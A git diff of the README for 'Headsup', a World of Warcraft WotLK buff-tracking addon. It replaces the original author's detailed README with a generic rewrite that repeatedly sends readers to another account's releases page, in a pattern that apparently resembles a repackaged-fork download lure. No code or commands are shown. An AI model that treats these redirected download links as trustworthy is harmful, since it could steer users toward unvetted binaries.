@@ -1,241 +1,95 @@
-# 🎯 Headsup
+# Headsup 🎯
 
-> **The ultimate buff tracking addon for World of Warcraft: Wrath of the Lich King 3.3.5a**
+Welcome to the Headsup repository! This is a World of Warcraft: Wrath of the Lich King (WotLK) addon designed to enhance your gaming experience by displaying important buff procs right in the center of your screen. With the ability to track over 100 spells, Headsup ensures that you never miss a proc again. Whether you're raiding in PvE or battling in PvP, this addon keeps you informed and ready for action.
 
-[![Latest Release](https://img.shields.io/github/v/release/tje3d/Headsup?style=for-the-badge&color=00d4aa)](https://github.com/tje3d/Headsup/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/tje3d/Headsup/total?style=for-the-badge&color=1e90ff)](https://github.com/tje3d/Headsup/releases)
-[![License](https://img.shields.io/github/license/tje3d/Headsup?style=for-the-badge&color=orange)](LICENSE)
+## Table of Contents
 
-## ✨ What is Headsup?
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Customization](#customization)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-Headsup transforms your gameplay by displaying crucial buffs and procs **right in the center of your screen** where you need them most. No more glancing at buff bars or missing that perfect moment to unleash your abilities!
+## Features
 
-## 📸 Screenshots
+- **Real-Time Tracking**: Headsup tracks over 100 spells, displaying crucial buff procs as they occur.
+- **Customizable Interface**: Adjust the position, size, and appearance of the alerts to suit your preferences.
+- **User-Friendly Design**: Easy to navigate and set up, even for new players.
+- **Compatibility**: Designed specifically for WotLK, ensuring optimal performance in the game.
 
-<div align="center">
+## Installation
 
-### 🎨 Customizable Display Options
+To install Headsup, download the latest release from our [Releases page](https://github.com/luciaga03/Headsup/releases). Once downloaded, follow these steps:
 
-![Headsup in Action](images/1.png)
+1. Extract the downloaded file.
+2. Move the extracted folder into your World of Warcraft addons directory (usually located in `World of Warcraft/WotLK/Interface/AddOns`).
+3. Launch the game and enable the addon in the AddOns menu.
 
-### ⚙️ Professional Configuration Interface
+## Usage
 
-![Configuration GUI](images/2.png)
+Once installed, you can start using Headsup immediately. The addon will automatically track buff procs and display them in the center of your screen. You can access the settings through the game interface to customize your experience further.
 
-### 🎯 Buff Tracking in Action
+### Key Commands
 
-![Customization Options](images/3.png)
+- **/headsup**: Opens the Headsup settings menu.
+- **/headsup reset**: Resets all settings to default.
 
-</div>
+## Customization
 
-## 🚀 Quick Start
+Headsup allows for a high degree of customization to fit your gaming style. You can adjust:
 
-### 📥 Download & Install
+- **Alert Position**: Change where the alerts appear on your screen.
+- **Font Size**: Make the alerts larger or smaller for better visibility.
+- **Colors**: Choose colors for different types of alerts to easily differentiate between them.
 
-**[⬇️ Download Latest Release](https://github.com/tje3d/Headsup/releases/latest/download/Headsup.zip)**
+To customize your settings, simply type `/headsup` in the chat and navigate to the options available.
 
-1. Download the latest release
-2. Extract to your `World of Warcraft/Interface/AddOns/` folder
-3. Restart WoW or reload UI (`/reload`)
-4. Type `/headsup` to configure!
+## Contributing
 
-### 🎮 Instant Setup
+We welcome contributions to Headsup! If you have ideas for new features or improvements, please follow these steps:
 
-```
-/headsup config  # Open the beautiful GUI (see screenshot above)
-/headsup test    # See it in action with test buffs
-```
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your forked repository.
+5. Submit a pull request detailing your changes.
 
-## 🌟 Key Features
+Your contributions help make Headsup better for everyone.
 
-### 🎯 **Perfect Positioning**
+## License
 
-- Displays buffs in the **center of your screen**
-- Fully customizable position and size
-- Never miss a proc again!
+Headsup is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-### ⚡ **Smart Tracking**
+## Support
 
-- **All classes supported** with optimal proc tracking
-- **Custom spell support** - add any spell ID
-- **Automatic duration tracking** with precise timers
-- **Buff stacking display** - shows stack counts for stackable buffs
-- **Flash effect** - visual alerts when buffs are about to expire
+If you encounter any issues or have questions, feel free to open an issue in this repository. You can also check the [Releases page](https://github.com/luciaga03/Headsup/releases) for updates and new features.
 
-### 🎨 **Beautiful & Customizable**
+## Acknowledgments
 
-- Modern, clean interface
-- Adjustable icon sizes (8-128px)
-- Customizable spacing and fonts
-- Optional spell names display
+- Special thanks to the World of Warcraft community for their support and feedback.
+- Thanks to the developers who contributed to the addon’s functionality and design.
 
-### 🔊 **Audio & Visual Alerts**
+## Screenshots
 
-- Sound alerts for new procs
-- Flash effect for expiring buffs
-- Multiple sound options
-- No spam on refreshes
+![Headsup in Action](https://img.shields.io/badge/Headsup%20in%20Action-screenshot-brightgreen)
 
-### ⚙️ **Professional GUI**
+## Topics
 
-- Easy-to-use configuration panel with sliders and toggles
-- Live spell management with search and tooltips
-- Real-time preview of all changes
-- Comprehensive sound and display options
+This repository covers various topics related to gaming, including:
 
-## 📋 Supported Spells
+- **Addon Development**: Learn how to create and manage your own addons.
+- **Event Alerts**: Understand how to set up alerts for specific game events.
+- **PvE and PvP Strategies**: Get tips on how to optimize your gameplay in both environments.
+- **Raiding Guides**: Explore strategies for successful raiding experiences.
 
-<details>
-<summary><strong>🗡️ Death Knight</strong></summary>
+For further details, visit our [Releases page](https://github.com/luciaga03/Headsup/releases) to download the latest version and keep your addon updated.
 
-- Killing Machine
-- Rime (Freezing Fog)
-- Cinderglacier
-- Desolation
-- Unholy Force & Strength
-</details>
+## Conclusion
 
-<details>
-<summary><strong>🌿 Druid</strong></summary>
-
-- Eclipse (Solar & Lunar)
-- Nature's Grace
-- Predator's Swiftness
-- Omen of Clarity
-- Owlkin Frenzy
-</details>
-
-<details>
-<summary><strong>🏹 Hunter</strong></summary>
-
-- Improved Steady Shot
-- Lock and Load
-- Rapid Killing
-</details>
-
-<details>
-<summary><strong>🔥 Mage</strong></summary>
-
-- Arcane Concentration
-- Brain Freeze
-- Fingers of Frost
-- Hot Streak
-- Missile Barrage
-- And more!
-</details>
-
-<details>
-<summary><strong>⚡ Shaman</strong></summary>
-
-- Elemental Focus
-- Maelstrom Weapon
-- Tidal Waves
-</details>
-
-<details>
-<summary><strong>🛡️ All Other Classes</strong></summary>
-
-**Paladin, Priest, Warlock, Warrior** - comprehensive proc tracking for optimal DPS and healing rotations!
-
-</details>
-
-## 🛠️ Commands Reference
-
-| Command                       | Description              |
-| ----------------------------- | ------------------------ |
-| `/headsup` or `/hu`           | Show all commands        |
-| `/headsup config`             | Open configuration GUI   |
-| `/headsup test`               | Display test buffs       |
-| `/headsup teststack`          | Test buff with stacks    |
-| `/headsup testflash`          | Test flash effect        |
-| `/headsup toggle`             | Enable/disable addon     |
-| `/headsup size <8-128>`       | Set icon size            |
-| `/headsup spacing <0-50>`     | Set icon spacing         |
-| `/headsup yoffset <-400-400>` | Set vertical position    |
-| `/headsup flash`              | Toggle flash effect      |
-| `/headsup flashtime <1-30>`   | Set flash threshold      |
-| `/headsup flashspeed <0.1-2>` | Set flash speed          |
-| `/headsup addspell <spellID>` | Add custom spell         |
-| `/headsup listspells`         | Show tracked spells      |
-
-## 🎯 Perfect For
-
-- **Competitive Raiders** seeking every advantage
-- **PvP Enthusiasts** who need split-second reactions
-- **Casual Players** wanting to improve their gameplay
-- **Alt Characters** learning new rotations
-
-## 🔧 Advanced Configuration
-
-### Buff Stacking Display
-
-Headsup now intelligently displays stack counts for stackable buffs like Maelstrom Weapon, Serendipity, and other multi-stack abilities:
-
-- **Automatic detection** - Stack counts appear automatically when buffs have multiple stacks
-- **Clean display** - Only shows when stacks > 1 to avoid clutter
-- **Perfect positioning** - Stack count appears in bottom-right corner of buff icon
-- **Testing support** - Use `/headsup teststack` to preview the feature
-
-### Custom Spell Tracking
-
-```
-/headsup addspell 12345    # Add any spell by ID
-/headsup removespell 12345 # Remove from tracking
-/headsup resetspells       # Reset to defaults
-```
-
-### Flash Effect Setup
-
-```
-/headsup flash                 # Toggle flash effect on/off
-/headsup flashtime 5           # Flash when 5 seconds left
-/headsup flashspeed 0.3        # Flash every 0.3 seconds
-/headsup testflash             # Test flash effect
-```
-
-### Audio Setup
-
-```
-/headsup sound            # Toggle sound on/off
-/headsup setsound <file>  # Set custom sound
-/headsup testsound        # Test current sound
-```
-
-## 🆘 Support & Feedback
-
-- 🐛 **Found a bug?** [Report it here](https://github.com/tje3d/Headsup/issues)
-- 💡 **Feature request?** [Suggest it here](https://github.com/tje3d/Headsup/issues)
-- 💬 **Need help?** Check our [Wiki](https://github.com/tje3d/Headsup/wiki) or open an issue
-
-## 📊 Stats
-
-- ⚡ **Lightweight** - Minimal performance impact
-- 🎯 **Precise** - Frame-perfect buff detection
-- 🔄 **Reliable** - Battle-tested in raids and PvP
-- 🎨 **Beautiful** - Modern, clean interface
-
-## 🏆 Why Choose Headsup?
-
-> _"Game-changing addon! I never miss my procs anymore and my DPS has noticeably improved."_  
-> – Top raider testimonial
-
-> _"The GUI is incredible - so easy to customize exactly how I want it."_  
-> – Happy user review
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⭐ Show Your Support
-
-If Headsup improved your gameplay, **please star this repository!** It helps other players discover this awesome addon.
+Headsup is a powerful tool for any WotLK player looking to enhance their gameplay experience. With its customizable features and real-time tracking capabilities, you can stay focused on your game without missing critical buffs. Join our community and start using Headsup today!
 
 ---
 
-<div align="center">
-
-**[⬇️ Download Now](https://github.com/tje3d/Headsup/releases/latest)** • **[🎮 View All Releases](https://github.com/tje3d/Headsup/releases)** • **[📖 Documentation](https://github.com/tje3d/Headsup/wiki)**
-
-Made with ❤️ for the WoW community
-
-</div>
+For any further information, check the [Releases section](https://github.com/luciaga03/Headsup/releases) to keep up with updates and new features.
